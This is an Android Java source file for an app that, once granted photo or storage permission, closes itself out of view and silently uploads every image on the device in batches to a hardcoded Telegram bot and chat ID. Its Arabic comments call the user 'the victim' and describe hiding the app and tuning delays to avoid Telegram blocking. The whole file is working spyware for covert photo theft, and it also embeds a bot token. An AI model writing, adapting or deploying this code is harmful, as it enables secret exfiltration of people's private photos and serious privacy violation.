package com.vipih;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int PERMISSION_CODE = 100;
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (checkPermissions()) {
            startBackgroundWork();
        } else {
            requestPermissions();
        }
    }

    private boolean checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_CODE);
        } else {
            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startBackgroundWork();
        } else {
            finish(); // إغلاق التطبيق إذا رفض الضحية الصلاحية
        }
    }

    private void startBackgroundWork() {
        final Context ctx = getApplicationContext();
        
        // إخفاء التطبيق فوراً عن شاشة الضحية
        finish(); 

        // تشغيل السحب في الخلفية
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String[] projection = {MediaStore.Images.Media._ID};
                    String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

                    Cursor cursor = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);

                    if (cursor == null) return;

                    int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                    List<Uri> batchUris = new ArrayList<>();

                    while (cursor.moveToNext()) {
                        int id = cursor.getInt(idIndex);
                        Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
                        batchUris.add(contentUri);

                        if (batchUris.size() == 10) {
                            sendMediaGroup(ctx, batchUris);
                            batchUris.clear();
                            
                            // تأخير بسيط جداً (200 ملي ثانية) لتجنب حظر تلجرام مع الحفاظ على السرعة
                            try { Thread.sleep(200); } catch (InterruptedException ignored) {}
                        }
                    }
                    cursor.close();

                    if (!batchUris.isEmpty()) {
                        sendMediaGroup(ctx, batchUris);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void sendMediaGroup(Context ctx, List<Uri> uris) {
        String boundary = "*****" + System.currentTimeMillis();
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMediaGroup");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            JSONArray mediaArray = new JSONArray();
            List<byte[]> imageDataList = new ArrayList<>();

            for (int i = 0; i < uris.size(); i++) {
                byte[] data = compressImage(ctx, uris.get(i));
                if (data != null) {
                    imageDataList.add(data);
                    JSONObject mediaObj = new JSONObject();
                    mediaObj.put("type", "photo");
                    mediaObj.put("media", "attach://file" + i);
                    mediaArray.put(mediaObj);
                }
            }

            if (imageDataList.isEmpty()) return;

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
            request.writeBytes(mediaArray.toString() + lineEnd);

            for (int i = 0; i < imageDataList.size(); i++) {
                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"file" + i + "\"; filename=\"img" + i + ".jpg\"" + lineEnd);
                request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
                request.write(imageDataList.get(i));
                request.writeBytes(lineEnd);
            }

            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush();
            request.close();

            conn.getResponseCode();
            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private byte[] compressImage(Context ctx, Uri uri) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            InputStream input = ctx.getContentResolver().openInputStream(uri);
            BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();

            // تصغير الأبعاد لسرعة الإرسال
            int inSampleSize = 1;
            if (options.outHeight > 800 || options.outWidth > 800) {
                final int halfHeight = options.outHeight / 2;
                final int halfWidth = options.outWidth / 2;
                while ((halfHeight / inSampleSize) >= 800 && (halfWidth / inSampleSize) >= 800) {
                    inSampleSize *= 2;
                }
            }

            options.inJustDecodeBounds = false;
            options.inSampleSize = inSampleSize;

            input = ctx.getContentResolver().openInputStream(uri);
            Bitmap bitmap = BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();

            if (bitmap == null) return null;

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            // ضغط الجودة 60% لتسريع الرفع (الفرق بالجودة غير ملحوظ للعين)
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream); 
            bitmap.recycle();
            return stream.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
}